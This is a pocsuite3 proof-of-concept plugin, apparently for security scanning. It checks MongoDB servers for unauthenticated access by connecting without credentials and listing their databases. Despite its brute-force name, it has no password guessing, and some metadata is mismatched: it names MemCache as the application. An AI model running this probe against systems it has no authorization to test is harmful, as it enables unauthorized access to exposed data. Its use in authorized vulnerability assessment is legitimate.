#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File : mongodb_burst.py
# @Author : Norah C.IV
# @Time : 2022/4/25 15:33
# @Software: PyCharm
import pymongo
import socket
import queue

from pocsuite3.api import POCBase, Output, register_poc, POC_CATEGORY, VUL_TYPE
from pocsuite3.lib.core.data import logger

task_queue = queue.Queue()
result_queue = queue.Queue()


class DemoPOC(POCBase):
    vulID = '5'
    version = '1'
    author = ['Norah C.IV']
    vulDate = '2022-04-25'
    createDate = '2022-04-25'
    updateDate = '2022-04-25'
    references = ['']
    name = 'MongoDB 弱密码(未授权访问)'
    appPowerLink = ''
    appName = 'MemCache'
    appVersion = 'All'
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''MongoDB 存在弱密码(未授权访问)，导致攻击者可连接主机进行恶意操作'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.PROTOCOL.MONGODB

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 27017

        mongodb_burst(host, port)
        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


def port_check(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        res = s.connect_ex((host, int(port)))
        if res == 0:
            return True
    except:
        return False


def unauthorized_access(host, port):
    ret = False
    try:
        conn = pymongo.MongoClient(host, int(port))
        db_one = conn.list_database_names()
        if db_one:
            ret = True
    except Exception:
        pass
    return ret


def mongodb_burst(host, port):
    if not port_check(host, port):
        logger.warning("{}:{} is unreachable".format(host, port))
        return

    if unauthorized_access(host, port):
        result_queue.put(('<empty>', '<empty>'))
        return


register_poc(DemoPOC)
